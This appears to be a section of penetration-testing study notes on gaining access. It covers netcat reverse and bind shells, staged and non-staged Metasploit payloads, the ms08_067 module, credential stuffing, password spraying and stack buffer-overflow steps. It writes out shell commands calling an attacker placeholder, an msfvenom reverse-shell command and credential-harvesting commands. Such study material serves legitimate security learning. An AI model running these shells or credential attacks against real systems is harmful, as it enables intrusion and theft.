# Gaining Access

After enumeration you need to exploit weaknesses to obtain a foothold.  Your notes describe shells, payloads, exploitation frameworks and buffer‑overflow techniques【284038306346389†L11-L103】.

## Shells

- **Reverse shell:** the target connects back to your listener.  Example using netcat:

  ```bash
  # On attacker
  nc -lvnp 4444

  # On target (if you have code execution)
  nc <attacker_ip> 4444 -e /bin/bash
  ```

- **Bind shell:** the target listens on a port and the attacker connects to it:

  ```bash
  # On target
  nc -lvnp 4444 -e /bin/bash

  # On attacker
  nc <target_ip> 4444
  ```

Netcat is invaluable for establishing basic shells【284038306346389†L11-L103】.  Be aware of firewall rules and anti‑virus when choosing a port.

## Payloads

Metasploit classifies payloads as **staged** or **non‑staged**【284038306346389†L11-L103】.

- **Staged payloads** (e.g., `windows/meterpreter/reverse_tcp`) send a small stager first, which downloads the full payload.
- **Non‑staged payloads** (e.g., `windows/meterpreter_reverse_http`) send the entire payload in one go.  These are larger but don’t require an additional download.

Choose based on network restrictions and size limitations.

## Exploitation with Metasploit

Metasploit can greatly streamline exploitation:

1. **Search for exploits:** `search type:exploit name` or use `searchsploit` externally【284038306346389†L11-L103】.
2. **Configure the module:** `use exploit/windows/smb/ms08_067_netapi` then set required options (RHOSTS, LHOST, payload)【284038306346389†L11-L103】.
3. **Run the exploit:** `exploit` or `run`.  If successful, a session opens.
4. **Post‑exploitation:** use Meterpreter commands (e.g., `hashdump`, `getsystem`) to harvest credentials and pivot.

## Credential attacks

- **Credential stuffing:** reuse leaked username/password combinations across multiple services.
- **Password spraying:** try a few common passwords against many accounts to avoid locking accounts【284038306346389†L11-L103】.

Tools like Burp Suite can automate these attacks against web logins【284038306346389†L11-L103】.

## Buffer‑overflow methodology

Your notes detail the steps for exploiting a classic stack buffer overflow【284038306346389†L11-L103】:

1. **Spiking/fuzzing:** send increasingly large inputs to crash the program.
2. **Find offset:** locate where the input overwrites the Instruction Pointer (EIP) using pattern generation and offset calculation.
3. **Confirm control of EIP:** overwrite EIP with a test value and confirm it reflects your input.
4. **Find bad characters:** determine which bytes cannot appear in the payload (e.g., `\x00`).
5. **Find a jump point:** locate a `jmp esp` or similar instruction in a module without memory protection (DEP/ASLR).
6. **Generate shellcode:** use `msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -b "<badchars>" -f c`【284038306346389†L11-L103】.
7. **Build exploit:** construct the final payload (padding + EIP overwrite + NOP sled + shellcode) and test it.

Understanding memory layout (stack vs heap, EBP/EIP registers) is crucial【284038306346389†L11-L103】.  Practise in controlled environments to avoid crashes in production.
